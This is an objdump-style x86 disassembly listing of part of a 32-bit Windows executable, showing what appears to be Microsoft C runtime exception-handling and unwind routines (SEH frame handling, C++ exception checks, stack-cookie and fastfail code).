  403113:	50                   	push   %eax
  403114:	e8 5b f2 ff ff       	call   0x402374
  403119:	f7 d8                	neg    %eax
  40311b:	59                   	pop    %ecx
  40311c:	1a c0                	sbb    %al,%al
  40311e:	59                   	pop    %ecx
  40311f:	fe c0                	inc    %al
  403121:	5d                   	pop    %ebp
  403122:	c2 04 00             	ret    $0x4
  403125:	55                   	push   %ebp
  403126:	8b ec                	mov    %esp,%ebp
  403128:	56                   	push   %esi
  403129:	8b f1                	mov    %ecx,%esi
  40312b:	8d 46 04             	lea    0x4(%esi),%eax
  40312e:	c7 06 a0 d1 40 00    	movl   $0x40d1a0,(%esi)
  403134:	50                   	push   %eax
  403135:	e8 64 09 00 00       	call   0x403a9e
  40313a:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40313e:	59                   	pop    %ecx
  40313f:	74 0a                	je     0x40314b
  403141:	6a 0c                	push   $0xc
  403143:	56                   	push   %esi
  403144:	e8 8b 8e 00 00       	call   0x40bfd4
  403149:	59                   	pop    %ecx
  40314a:	59                   	pop    %ecx
  40314b:	8b c6                	mov    %esi,%eax
  40314d:	5e                   	pop    %esi
  40314e:	5d                   	pop    %ebp
  40314f:	c2 04 00             	ret    $0x4
  403152:	6a 3c                	push   $0x3c
  403154:	68 88 25 41 00       	push   $0x412588
  403159:	e8 42 ea ff ff       	call   0x401ba0
  40315e:	8b 45 18             	mov    0x18(%ebp),%eax
  403161:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403164:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  403168:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40316b:	8b 43 fc             	mov    -0x4(%ebx),%eax
  40316e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403171:	8b 75 08             	mov    0x8(%ebp),%esi
  403174:	ff 76 18             	push   0x18(%esi)
  403177:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40317a:	50                   	push   %eax
  40317b:	e8 de ee ff ff       	call   0x40205e
  403180:	59                   	pop    %ecx
  403181:	59                   	pop    %ecx
  403182:	89 45 cc             	mov    %eax,-0x34(%ebp)
  403185:	e8 5c f5 ff ff       	call   0x4026e6
  40318a:	8b 40 10             	mov    0x10(%eax),%eax
  40318d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  403190:	e8 51 f5 ff ff       	call   0x4026e6
  403195:	8b 40 14             	mov    0x14(%eax),%eax
  403198:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40319b:	e8 46 f5 ff ff       	call   0x4026e6
  4031a0:	89 70 10             	mov    %esi,0x10(%eax)
  4031a3:	e8 3e f5 ff ff       	call   0x4026e6
  4031a8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4031ab:	89 48 14             	mov    %ecx,0x14(%eax)
  4031ae:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4031b2:	33 c0                	xor    %eax,%eax
  4031b4:	40                   	inc    %eax
  4031b5:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4031b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4031bb:	ff 75 20             	push   0x20(%ebp)
  4031be:	ff 75 1c             	push   0x1c(%ebp)
  4031c1:	ff 75 18             	push   0x18(%ebp)
  4031c4:	ff 75 14             	push   0x14(%ebp)
  4031c7:	53                   	push   %ebx
  4031c8:	e8 87 ec ff ff       	call   0x401e54
  4031cd:	83 c4 14             	add    $0x14,%esp
  4031d0:	8b d8                	mov    %eax,%ebx
  4031d2:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4031d5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4031d9:	e9 9c 00 00 00       	jmp    0x40327a
  4031de:	ff 75 ec             	push   -0x14(%ebp)
  4031e1:	e8 7a 01 00 00       	call   0x403360
  4031e6:	59                   	pop    %ecx
  4031e7:	c3                   	ret
  4031e8:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4031eb:	e8 f6 f4 ff ff       	call   0x4026e6
  4031f0:	83 60 20 00          	andl   $0x0,0x20(%eax)
  4031f4:	8b 75 14             	mov    0x14(%ebp),%esi
  4031f7:	8b 46 08             	mov    0x8(%esi),%eax
  4031fa:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4031fd:	56                   	push   %esi
  4031fe:	ff 75 18             	push   0x18(%ebp)
  403201:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403204:	53                   	push   %ebx
  403205:	e8 06 08 00 00       	call   0x403a10
  40320a:	83 c4 0c             	add    $0xc,%esp
  40320d:	8b d0                	mov    %eax,%edx
  40320f:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403212:	8b 46 10             	mov    0x10(%esi),%eax
  403215:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403218:	33 c9                	xor    %ecx,%ecx
  40321a:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40321d:	39 4e 0c             	cmp    %ecx,0xc(%esi)
  403220:	76 40                	jbe    0x403262
  403222:	6b c1 14             	imul   $0x14,%ecx,%eax
  403225:	8b 5e 10             	mov    0x10(%esi),%ebx
  403228:	3b 54 18 04          	cmp    0x4(%eax,%ebx,1),%edx
  40322c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40322f:	7e 28                	jle    0x403259
  403231:	6b c1 14             	imul   $0x14,%ecx,%eax
  403234:	8b 75 dc             	mov    -0x24(%ebp),%esi
  403237:	3b 54 30 08          	cmp    0x8(%eax,%esi,1),%edx
  40323b:	8b 75 14             	mov    0x14(%ebp),%esi
  40323e:	7f 19                	jg     0x403259
  403240:	6b c1 14             	imul   $0x14,%ecx,%eax
  403243:	8b 4e 10             	mov    0x10(%esi),%ecx
  403246:	8b 44 08 04          	mov    0x4(%eax,%ecx,1),%eax
  40324a:	40                   	inc    %eax
  40324b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40324e:	8b 55 d8             	mov    -0x28(%ebp),%edx
  403251:	8b 14 c2             	mov    (%edx,%eax,8),%edx
  403254:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403257:	eb 09                	jmp    0x403262
  403259:	41                   	inc    %ecx
  40325a:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40325d:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403260:	72 c0                	jb     0x403222
  403262:	52                   	push   %edx
  403263:	56                   	push   %esi
  403264:	6a 00                	push   $0x0
  403266:	53                   	push   %ebx
  403267:	e8 56 01 00 00       	call   0x4033c2
  40326c:	83 c4 10             	add    $0x10,%esp
  40326f:	33 db                	xor    %ebx,%ebx
  403271:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403274:	21 5d fc             	and    %ebx,-0x4(%ebp)
  403277:	8b 75 08             	mov    0x8(%ebp),%esi
  40327a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403281:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  403288:	e8 18 00 00 00       	call   0x4032a5
  40328d:	8b c3                	mov    %ebx,%eax
  40328f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403292:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403299:	59                   	pop    %ecx
  40329a:	5f                   	pop    %edi
  40329b:	5e                   	pop    %esi
  40329c:	5b                   	pop    %ebx
  40329d:	c9                   	leave
  40329e:	c3                   	ret
  40329f:	8b 75 08             	mov    0x8(%ebp),%esi
  4032a2:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  4032a5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4032a8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4032ab:	89 41 fc             	mov    %eax,-0x4(%ecx)
  4032ae:	ff 75 cc             	push   -0x34(%ebp)
  4032b1:	e8 cc ed ff ff       	call   0x402082
  4032b6:	59                   	pop    %ecx
  4032b7:	e8 2a f4 ff ff       	call   0x4026e6
  4032bc:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4032bf:	89 48 10             	mov    %ecx,0x10(%eax)
  4032c2:	e8 1f f4 ff ff       	call   0x4026e6
  4032c7:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4032ca:	89 48 14             	mov    %ecx,0x14(%eax)
  4032cd:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  4032d3:	75 4b                	jne    0x403320
  4032d5:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  4032d9:	75 45                	jne    0x403320
  4032db:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
  4032e2:	74 12                	je     0x4032f6
  4032e4:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
  4032eb:	74 09                	je     0x4032f6
  4032ed:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
  4032f4:	75 2a                	jne    0x403320
  4032f6:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4032fa:	75 24                	jne    0x403320
  4032fc:	85 db                	test   %ebx,%ebx
  4032fe:	74 20                	je     0x403320
  403300:	ff 76 18             	push   0x18(%esi)
  403303:	e8 ae f1 ff ff       	call   0x4024b6
  403308:	59                   	pop    %ecx
  403309:	85 c0                	test   %eax,%eax
  40330b:	74 13                	je     0x403320
  40330d:	83 7d bc 00          	cmpl   $0x0,-0x44(%ebp)
  403311:	0f 95 c0             	setne  %al
  403314:	0f b6 c0             	movzbl %al,%eax
  403317:	50                   	push   %eax
  403318:	56                   	push   %esi
  403319:	e8 92 f0 ff ff       	call   0x4023b0
  40331e:	59                   	pop    %ecx
  40331f:	59                   	pop    %ecx
  403320:	c3                   	ret
  403321:	6a 04                	push   $0x4
  403323:	b8 92 c1 40 00       	mov    $0x40c192,%eax
  403328:	e8 b5 8c 00 00       	call   0x40bfe2
  40332d:	e8 b4 f3 ff ff       	call   0x4026e6
  403332:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  403336:	75 1d                	jne    0x403355
  403338:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40333c:	e8 b2 06 00 00       	call   0x4039f3
  403341:	e8 a0 f3 ff ff       	call   0x4026e6
  403346:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403349:	6a 00                	push   $0x0
  40334b:	6a 00                	push   $0x0
  40334d:	89 48 1c             	mov    %ecx,0x1c(%eax)
  403350:	e8 68 07 00 00       	call   0x403abd
  403355:	e8 6b 1f 00 00       	call   0x4052c5
  40335a:	cc                   	int3
  40335b:	cc                   	int3
  40335c:	cc                   	int3
  40335d:	cc                   	int3
  40335e:	cc                   	int3
  40335f:	cc                   	int3
  403360:	55                   	push   %ebp
  403361:	8b ec                	mov    %esp,%ebp
  403363:	8b 45 08             	mov    0x8(%ebp),%eax
  403366:	8b 00                	mov    (%eax),%eax
  403368:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  40336e:	75 36                	jne    0x4033a6
  403370:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  403374:	75 30                	jne    0x4033a6
  403376:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  40337d:	74 12                	je     0x403391
  40337f:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
  403386:	74 09                	je     0x403391
  403388:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
  40338f:	75 15                	jne    0x4033a6
  403391:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  403395:	75 0f                	jne    0x4033a6
  403397:	e8 4a f3 ff ff       	call   0x4026e6
  40339c:	33 c9                	xor    %ecx,%ecx
  40339e:	41                   	inc    %ecx
  40339f:	89 48 20             	mov    %ecx,0x20(%eax)
  4033a2:	8b c1                	mov    %ecx,%eax
  4033a4:	5d                   	pop    %ebp
  4033a5:	c3                   	ret
  4033a6:	33 c0                	xor    %eax,%eax
  4033a8:	5d                   	pop    %ebp
  4033a9:	c3                   	ret
  4033aa:	55                   	push   %ebp
  4033ab:	8b ec                	mov    %esp,%ebp
  4033ad:	6a ff                	push   $0xffffffff
  4033af:	ff 75 10             	push   0x10(%ebp)
  4033b2:	ff 75 0c             	push   0xc(%ebp)
  4033b5:	ff 75 08             	push   0x8(%ebp)
  4033b8:	e8 05 00 00 00       	call   0x4033c2
  4033bd:	83 c4 10             	add    $0x10,%esp
  4033c0:	5d                   	pop    %ebp
  4033c1:	c3                   	ret
  4033c2:	6a 10                	push   $0x10
  4033c4:	68 60 25 41 00       	push   $0x412560
  4033c9:	e8 d2 e7 ff ff       	call   0x401ba0
  4033ce:	ff 75 10             	push   0x10(%ebp)
  4033d1:	ff 75 0c             	push   0xc(%ebp)
  4033d4:	ff 75 08             	push   0x8(%ebp)
  4033d7:	e8 34 06 00 00       	call   0x403a10
  4033dc:	83 c4 0c             	add    $0xc,%esp
  4033df:	8b f0                	mov    %eax,%esi
  4033e1:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4033e4:	e8 fd f2 ff ff       	call   0x4026e6
  4033e9:	ff 40 18             	incl   0x18(%eax)
  4033ec:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4033f0:	3b 75 14             	cmp    0x14(%ebp),%esi
  4033f3:	74 68                	je     0x40345d
  4033f5:	83 fe ff             	cmp    $0xffffffff,%esi
  4033f8:	0f 8e a6 00 00 00    	jle    0x4034a4
  4033fe:	8b 7d 10             	mov    0x10(%ebp),%edi
  403401:	3b 77 04             	cmp    0x4(%edi),%esi
  403404:	0f 8d 9a 00 00 00    	jge    0x4034a4
  40340a:	8b 47 08             	mov    0x8(%edi),%eax
  40340d:	8b 0c f0             	mov    (%eax,%esi,8),%ecx
  403410:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403413:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40341a:	83 7c f0 04 00       	cmpl   $0x0,0x4(%eax,%esi,8)
  40341f:	74 30                	je     0x403451
  403421:	51                   	push   %ecx
  403422:	57                   	push   %edi
  403423:	ff 75 08             	push   0x8(%ebp)
  403426:	e8 02 06 00 00       	call   0x403a2d
  40342b:	83 c4 0c             	add    $0xc,%esp
  40342e:	68 03 01 00 00       	push   $0x103
  403433:	ff 75 08             	push   0x8(%ebp)
  403436:	8b 47 08             	mov    0x8(%edi),%eax
  403439:	ff 74 f0 04          	push   0x4(%eax,%esi,8)
  40343d:	e8 3e 01 00 00       	call   0x403580
  403442:	eb 0d                	jmp    0x403451
  403444:	ff 75 ec             	push   -0x14(%ebp)
  403447:	e8 b5 f0 ff ff       	call   0x402501
  40344c:	59                   	pop    %ecx
  40344d:	c3                   	ret
  40344e:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403451:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403455:	8b 75 e0             	mov    -0x20(%ebp),%esi
  403458:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40345b:	eb 93                	jmp    0x4033f0
  40345d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403464:	e8 27 00 00 00       	call   0x403490
  403469:	3b 75 14             	cmp    0x14(%ebp),%esi
  40346c:	75 36                	jne    0x4034a4
  40346e:	56                   	push   %esi
  40346f:	ff 75 10             	push   0x10(%ebp)
  403472:	ff 75 08             	push   0x8(%ebp)
  403475:	e8 b3 05 00 00       	call   0x403a2d
  40347a:	83 c4 0c             	add    $0xc,%esp
  40347d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403480:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403487:	59                   	pop    %ecx
  403488:	5f                   	pop    %edi
  403489:	5e                   	pop    %esi
  40348a:	5b                   	pop    %ebx
  40348b:	c9                   	leave
  40348c:	c3                   	ret
  40348d:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403490:	e8 51 f2 ff ff       	call   0x4026e6
  403495:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  403499:	7e 08                	jle    0x4034a3
  40349b:	e8 46 f2 ff ff       	call   0x4026e6
  4034a0:	ff 48 18             	decl   0x18(%eax)
  4034a3:	c3                   	ret
  4034a4:	e8 1c 1e 00 00       	call   0x4052c5
  4034a9:	cc                   	int3
  4034aa:	55                   	push   %ebp
  4034ab:	8b ec                	mov    %esp,%ebp
  4034ad:	83 ec 1c             	sub    $0x1c,%esp
  4034b0:	53                   	push   %ebx
  4034b1:	56                   	push   %esi
  4034b2:	8b 75 0c             	mov    0xc(%ebp),%esi
  4034b5:	57                   	push   %edi
  4034b6:	85 f6                	test   %esi,%esi
  4034b8:	0f 84 80 00 00 00    	je     0x40353e
  4034be:	8b 3e                	mov    (%esi),%edi
  4034c0:	33 db                	xor    %ebx,%ebx
  4034c2:	85 ff                	test   %edi,%edi
  4034c4:	7e 71                	jle    0x403537
  4034c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4034c9:	8b d3                	mov    %ebx,%edx
  4034cb:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4034ce:	8b 40 1c             	mov    0x1c(%eax),%eax
  4034d1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4034d4:	8b 40 0c             	mov    0xc(%eax),%eax
  4034d7:	8b 08                	mov    (%eax),%ecx
  4034d9:	83 c0 04             	add    $0x4,%eax
  4034dc:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4034df:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4034e2:	8b c8                	mov    %eax,%ecx
  4034e4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4034e7:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4034ea:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4034ed:	85 c0                	test   %eax,%eax
  4034ef:	7e 38                	jle    0x403529
  4034f1:	8b 46 04             	mov    0x4(%esi),%eax
  4034f4:	03 c2                	add    %edx,%eax
  4034f6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4034f9:	ff 75 ec             	push   -0x14(%ebp)
  4034fc:	ff 31                	push   (%ecx)
  4034fe:	50                   	push   %eax
  4034ff:	e8 02 fa ff ff       	call   0x402f06
  403504:	83 c4 0c             	add    $0xc,%esp
  403507:	85 c0                	test   %eax,%eax
  403509:	75 19                	jne    0x403524
  40350b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40350e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403511:	48                   	dec    %eax
  403512:	83 c1 04             	add    $0x4,%ecx
  403515:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403518:	85 c0                	test   %eax,%eax
  40351a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40351d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403520:	7f d7                	jg     0x4034f9
  403522:	eb 02                	jmp    0x403526
  403524:	b3 01                	mov    $0x1,%bl
  403526:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403529:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40352c:	83 c2 10             	add    $0x10,%edx
  40352f:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403532:	83 ef 01             	sub    $0x1,%edi
  403535:	75 ab                	jne    0x4034e2
  403537:	5f                   	pop    %edi
  403538:	5e                   	pop    %esi
  403539:	8a c3                	mov    %bl,%al
  40353b:	5b                   	pop    %ebx
  40353c:	c9                   	leave
  40353d:	c3                   	ret
  40353e:	e8 82 1d 00 00       	call   0x4052c5
  403543:	cc                   	int3
  403544:	55                   	push   %ebp
  403545:	8b ec                	mov    %esp,%ebp
  403547:	ff 75 10             	push   0x10(%ebp)
  40354a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40354d:	ff 55 0c             	call   *0xc(%ebp)
  403550:	5d                   	pop    %ebp
  403551:	c2 0c 00             	ret    $0xc
  403554:	55                   	push   %ebp
  403555:	8b ec                	mov    %esp,%ebp
  403557:	ff 75 14             	push   0x14(%ebp)
  40355a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40355d:	ff 75 10             	push   0x10(%ebp)
  403560:	ff 55 0c             	call   *0xc(%ebp)
  403563:	5d                   	pop    %ebp
  403564:	c2 10 00             	ret    $0x10
  403567:	55                   	push   %ebp
  403568:	8b ec                	mov    %esp,%ebp
  40356a:	8b 45 08             	mov    0x8(%ebp),%eax
  40356d:	8b 40 1c             	mov    0x1c(%eax),%eax
  403570:	5d                   	pop    %ebp
  403571:	c3                   	ret
  403572:	8b 41 04             	mov    0x4(%ecx),%eax
  403575:	85 c0                	test   %eax,%eax
  403577:	75 05                	jne    0x40357e
  403579:	b8 a8 d1 40 00       	mov    $0x40d1a8,%eax
  40357e:	c3                   	ret
  40357f:	cc                   	int3
  403580:	55                   	push   %ebp
  403581:	8b ec                	mov    %esp,%ebp
  403583:	83 ec 04             	sub    $0x4,%esp
  403586:	53                   	push   %ebx
  403587:	51                   	push   %ecx
  403588:	8b 45 0c             	mov    0xc(%ebp),%eax
  40358b:	83 c0 0c             	add    $0xc,%eax
  40358e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403591:	8b 45 08             	mov    0x8(%ebp),%eax
  403594:	55                   	push   %ebp
  403595:	ff 75 10             	push   0x10(%ebp)
  403598:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40359b:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  40359e:	e8 0d 0b 00 00       	call   0x4040b0
  4035a3:	56                   	push   %esi
  4035a4:	57                   	push   %edi
  4035a5:	ff d0                	call   *%eax
  4035a7:	5f                   	pop    %edi
  4035a8:	5e                   	pop    %esi
  4035a9:	8b dd                	mov    %ebp,%ebx
  4035ab:	5d                   	pop    %ebp
  4035ac:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4035af:	55                   	push   %ebp
  4035b0:	8b eb                	mov    %ebx,%ebp
  4035b2:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4035b8:	75 05                	jne    0x4035bf
  4035ba:	b9 02 00 00 00       	mov    $0x2,%ecx
  4035bf:	51                   	push   %ecx
  4035c0:	e8 eb 0a 00 00       	call   0x4040b0
  4035c5:	5d                   	pop    %ebp
  4035c6:	59                   	pop    %ecx
  4035c7:	5b                   	pop    %ebx
  4035c8:	c9                   	leave
  4035c9:	c2 0c 00             	ret    $0xc
  4035cc:	55                   	push   %ebp
  4035cd:	8b ec                	mov    %esp,%ebp
  4035cf:	a1 3c d1 40 00       	mov    0x40d13c,%eax
  4035d4:	3d ff 18 40 00       	cmp    $0x4018ff,%eax
  4035d9:	74 1f                	je     0x4035fa
  4035db:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
  4035e2:	8b 45 08             	mov    0x8(%ebp),%eax
  4035e5:	8b 80 c4 00 00 00    	mov    0xc4(%eax),%eax
  4035eb:	3b 41 08             	cmp    0x8(%ecx),%eax
  4035ee:	72 05                	jb     0x4035f5
  4035f0:	3b 41 04             	cmp    0x4(%ecx),%eax
  4035f3:	76 05                	jbe    0x4035fa
  4035f5:	6a 0d                	push   $0xd
  4035f7:	59                   	pop    %ecx
  4035f8:	cd 29                	int    $0x29
  4035fa:	5d                   	pop    %ebp
  4035fb:	c3                   	ret
  4035fc:	cc                   	int3
  4035fd:	cc                   	int3
  4035fe:	cc                   	int3
  4035ff:	cc                   	int3
  403600:	53                   	push   %ebx
  403601:	56                   	push   %esi
  403602:	57                   	push   %edi
  403603:	8b 54 24 10          	mov    0x10(%esp),%edx
  403607:	8b 44 24 14          	mov    0x14(%esp),%eax
  40360b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40360f:	55                   	push   %ebp
  403610:	52                   	push   %edx
  403611:	50                   	push   %eax
  403612:	51                   	push   %ecx
  403613:	51                   	push   %ecx
  403614:	68 a0 36 40 00       	push   $0x4036a0
  403619:	64 ff 35 00 00 00 00 	push   %fs:0x0
  403620:	a1 00 40 41 00       	mov    0x414000,%eax
  403625:	33 c4                	xor    %esp,%eax
  403627:	89 44 24 08          	mov    %eax,0x8(%esp)
  40362b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403632:	8b 44 24 30          	mov    0x30(%esp),%eax
  403636:	8b 58 08             	mov    0x8(%eax),%ebx
  403639:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40363d:	33 19                	xor    (%ecx),%ebx
  40363f:	8b 70 0c             	mov    0xc(%eax),%esi
  403642:	83 fe fe             	cmp    $0xfffffffe,%esi
  403645:	0f 84 46 00 00 00    	je     0x403691
  40364b:	8b 54 24 34          	mov    0x34(%esp),%edx
  40364f:	83 fa fe             	cmp    $0xfffffffe,%edx
  403652:	74 08                	je     0x40365c
  403654:	3b f2                	cmp    %edx,%esi
  403656:	0f 86 35 00 00 00    	jbe    0x403691
  40365c:	8d 34 76             	lea    (%esi,%esi,2),%esi
  40365f:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  403663:	8b 0b                	mov    (%ebx),%ecx
  403665:	89 48 0c             	mov    %ecx,0xc(%eax)
  403668:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  40366c:	0f 85 c0 ff ff ff    	jne    0x403632
  403672:	68 01 01 00 00       	push   $0x101
  403677:	8b 43 08             	mov    0x8(%ebx),%eax
  40367a:	e8 41 0a 00 00       	call   0x4040c0
  40367f:	b9 01 00 00 00       	mov    $0x1,%ecx
  403684:	8b 43 08             	mov    0x8(%ebx),%eax
  403687:	e8 54 0a 00 00       	call   0x4040e0
  40368c:	e9 a1 ff ff ff       	jmp    0x403632
  403691:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  403698:	83 c4 18             	add    $0x18,%esp
  40369b:	5f                   	pop    %edi
  40369c:	5e                   	pop    %esi
  40369d:	5b                   	pop    %ebx
  40369e:	c3                   	ret
  40369f:	cc                   	int3
  4036a0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4036a4:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  4036ab:	b8 01 00 00 00       	mov    $0x1,%eax
  4036b0:	74 33                	je     0x4036e5
  4036b2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4036b6:	8b 48 08             	mov    0x8(%eax),%ecx
  4036b9:	33 c8                	xor    %eax,%ecx
  4036bb:	e8 9e db ff ff       	call   0x40125e
  4036c0:	55                   	push   %ebp
  4036c1:	8b 68 18             	mov    0x18(%eax),%ebp
  4036c4:	ff 70 0c             	push   0xc(%eax)
  4036c7:	ff 70 10             	push   0x10(%eax)
  4036ca:	ff 70 14             	push   0x14(%eax)
  4036cd:	e8 2e ff ff ff       	call   0x403600
  4036d2:	83 c4 0c             	add    $0xc,%esp
  4036d5:	5d                   	pop    %ebp
  4036d6:	8b 44 24 08          	mov    0x8(%esp),%eax
  4036da:	8b 54 24 10          	mov    0x10(%esp),%edx
  4036de:	89 02                	mov    %eax,(%edx)
  4036e0:	b8 03 00 00 00       	mov    $0x3,%eax
  4036e5:	c3                   	ret
  4036e6:	cc                   	int3
  4036e7:	cc                   	int3
  4036e8:	cc                   	int3
  4036e9:	cc                   	int3
  4036ea:	cc                   	int3
  4036eb:	cc                   	int3
  4036ec:	cc                   	int3
  4036ed:	cc                   	int3
  4036ee:	cc                   	int3
  4036ef:	cc                   	int3
  4036f0:	55                   	push   %ebp
  4036f1:	56                   	push   %esi
  4036f2:	57                   	push   %edi
  4036f3:	53                   	push   %ebx
  4036f4:	8b ea                	mov    %edx,%ebp
  4036f6:	33 c0                	xor    %eax,%eax
  4036f8:	33 db                	xor    %ebx,%ebx
  4036fa:	33 d2                	xor    %edx,%edx
  4036fc:	33 f6                	xor    %esi,%esi
  4036fe:	33 ff                	xor    %edi,%edi
  403700:	ff d1                	call   *%ecx
  403702:	5b                   	pop    %ebx
  403703:	5f                   	pop    %edi
  403704:	5e                   	pop    %esi
  403705:	5d                   	pop    %ebp
  403706:	c3                   	ret
  403707:	cc                   	int3
  403708:	cc                   	int3
  403709:	cc                   	int3
  40370a:	cc                   	int3
  40370b:	cc                   	int3
  40370c:	cc                   	int3
  40370d:	cc                   	int3
  40370e:	cc                   	int3
  40370f:	cc                   	int3
  403710:	8b ea                	mov    %edx,%ebp
  403712:	8b f1                	mov    %ecx,%esi
  403714:	8b c1                	mov    %ecx,%eax
  403716:	6a 01                	push   $0x1
  403718:	e8 a3 09 00 00       	call   0x4040c0
  40371d:	33 c0                	xor    %eax,%eax
  40371f:	33 db                	xor    %ebx,%ebx
  403721:	33 c9                	xor    %ecx,%ecx
  403723:	33 d2                	xor    %edx,%edx
  403725:	33 ff                	xor    %edi,%edi
  403727:	ff e6                	jmp    *%esi
  403729:	cc                   	int3
  40372a:	cc                   	int3
  40372b:	cc                   	int3
  40372c:	cc                   	int3
  40372d:	cc                   	int3
  40372e:	cc                   	int3
  40372f:	cc                   	int3
  403730:	55                   	push   %ebp
  403731:	8b ec                	mov    %esp,%ebp
  403733:	53                   	push   %ebx
  403734:	56                   	push   %esi
  403735:	57                   	push   %edi
  403736:	6a 00                	push   $0x0
  403738:	52                   	push   %edx
  403739:	68 45 37 40 00       	push   $0x403745
  40373e:	51                   	push   %ecx
  40373f:	ff 15 70 d0 40 00    	call   *0x40d070
  403745:	5f                   	pop    %edi
  403746:	5e                   	pop    %esi
  403747:	5b                   	pop    %ebx
  403748:	5d                   	pop    %ebp
  403749:	c3                   	ret
  40374a:	cc                   	int3
  40374b:	cc                   	int3
  40374c:	cc                   	int3
  40374d:	cc                   	int3
  40374e:	cc                   	int3
  40374f:	cc                   	int3
  403750:	55                   	push   %ebp
  403751:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  403755:	52                   	push   %edx
  403756:	51                   	push   %ecx
  403757:	ff 74 24 14          	push   0x14(%esp)
  40375b:	e8 a0 fe ff ff       	call   0x403600
  403760:	83 c4 0c             	add    $0xc,%esp
  403763:	5d                   	pop    %ebp
  403764:	c2 08 00             	ret    $0x8
